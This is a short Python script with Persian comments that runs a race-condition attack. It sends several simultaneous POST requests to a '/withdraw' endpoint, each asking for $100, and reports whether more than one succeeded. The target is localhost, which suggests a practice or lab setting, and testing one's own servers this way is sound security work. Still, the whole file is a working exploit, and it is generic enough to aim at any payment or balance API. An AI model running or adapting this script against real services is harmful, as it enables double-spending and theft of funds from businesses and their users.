import requests
from concurrent.futures import ThreadPoolExecutor

def withdraw_money(url):
    # هر درخواست تلاش می‌کنه ۱۰۰ دلار برداشت کنه
    data = {"amount": 100}
    try:
        r = requests.post(url, json=data, timeout=5)
        return r.text
    except:
        return "Error"

def exploit_race(url, threads=5):
    print(f"[*] Starting Race Condition attack on {url}")
    print(f"[*] Sending {threads} simultaneous requests to withdraw $100 each...")
    
    # ارسال همزمان درخواست‌ها با ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = list(executor.map(lambda _: withdraw_money(url), range(threads)))
        
    for i, res in enumerate(results):
        print(f"    [Thread {i+1}] Response: {res}")
        
    print("\n[*] Attack finished.")
    print("[!] If multiple requests succeeded, the server is vulnerable to Race Condition!")

if __name__ == "__main__":
    target = "http://127.0.0.1:8000/withdraw"
    exploit_race(target, threads=5)
